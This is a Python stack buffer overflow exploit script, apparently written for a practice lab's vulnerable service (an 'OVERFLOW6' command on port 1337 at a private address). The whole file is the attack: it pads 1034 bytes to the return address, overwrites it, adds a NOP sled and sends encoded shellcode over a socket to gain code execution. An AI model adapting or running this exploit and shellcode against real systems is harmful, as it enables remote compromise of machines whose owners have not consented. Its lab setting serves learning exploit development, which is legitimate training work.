#!/usr/bin/env python3

import socket, sys


'''
Getting offset 
'''


ip = "10.10.42.175"
port = 1337

prefix = b"OVERFLOW6 "
offset = 1034
overflow = b"A" * offset
retn = b"\xeb\x11\x50\x62"
padding = b"\x90"*16      # used for giving some space to unpack encoding(in this case, shikataganai)

shellcode = b"\xbf\x3d\x3e\x44\x13\xda\xde\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x52\x31\x78\x12\x03\x78\x12\x83\xd5\xc2\xa6\xe6\xd9\xd3\xa5\x09\x21\x24\xca\x80\xc4\x15\xca\xf7\x8d\x06\xfa\x7c\xc3\xaa\x71\xd0\xf7\x39\xf7\xfd\xf8\x8a\xb2\xdb\x37\x0a\xee\x18\x56\x88\xed\x4c\xb8\xb1\x3d\x81\xb9\xf6\x20\x68\xeb\xaf\x2f\xdf\x1b\xdb\x7a\xdc\x90\x97\x6b\x64\x45\x6f\x8d\x45\xd8\xfb\xd4\x45\xdb\x28\x6d\xcc\xc3\x2d\x48\x86\x78\x85\x26\x19\xa8\xd7\xc7\xb6\x95\xd7\x35\xc6\xd2\xd0\xa5\xbd\x2a\x23\x5b\xc6\xe9\x59\x87\x43\xe9\xfa\x4c\xf3\xd5\xfb\x81\x62\x9e\xf0\x6e\xe0\xf8\x14\x70\x25\x73\x20\xf9\xc8\x53\xa0\xb9\xee\x77\xe8\x1a\x8e\x2e\x54\xcc\xaf\x30\x37\xb1\x15\x3b\xda\xa6\x27\x66\xb3\x0b\x0a\x98\x43\x04\x1d\xeb\x71\x8b\xb5\x63\x3a\x44\x10\x74\x3d\x7f\xe4\xea\xc0\x80\x15\x23\x07\xd4\x45\x5b\xae\x55\x0e\x9b\x4f\x80\x81\xcb\xff\x7b\x62\xbb\xbf\x2b\x0a\xd1\x4f\x13\x2a\xda\x85\x3c\xc1\x21\x4e\x49\x1e\x59\x73\x25\x1c\x99\x9a\xea\xa9\x7f\xf6\x02\xfc\x28\x6f\xba\xa5\xa2\x0e\x43\x70\xcf\x11\xcf\x77\x30\xdf\x38\xfd\x22\x88\xc8\x48\x18\x1f\xd6\x66\x34\xc3\x45\xed\xc4\x8a\x75\xba\x93\xdb\x48\xb3\x71\xf6\xf3\x6d\x67\x0b\x65\x55\x23\xd0\x56\x58\xaa\x95\xe3\x7e\xbc\x63\xeb\x3a\xe8\x3b\xba\x94\x46\xfa\x14\x57\x30\x54\xca\x31\xd4\x21\x20\x82\xa2\x2d\x6d\x74\x4a\x9f\xd8\xc1\x75\x10\x8d\xc5\x0e\x4c\x2d\x29\xc5\xd4\x4d\xc8\xcf\x20\xe6\x55\x9a\x88\x6b\x66\x71\xce\x95\xe5\x73\xaf\x61\xf5\xf6\xaa\x2e\xb1\xeb\xc6\x3f\x54\x0b\x74\x3f\x7d"


#postfix = b""

payload = prefix + overflow + retn + padding + shellcode     #Add NOPs \x90

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
    s.connect((ip,port))
    print("Sending payload...")
    #s.recv(1024)
    s.send(payload + b'\r\n')
    #s.recv(1024)
    print("Done!")
    s.close

except:
    print("Cannot connect to server")
    sys.exit()
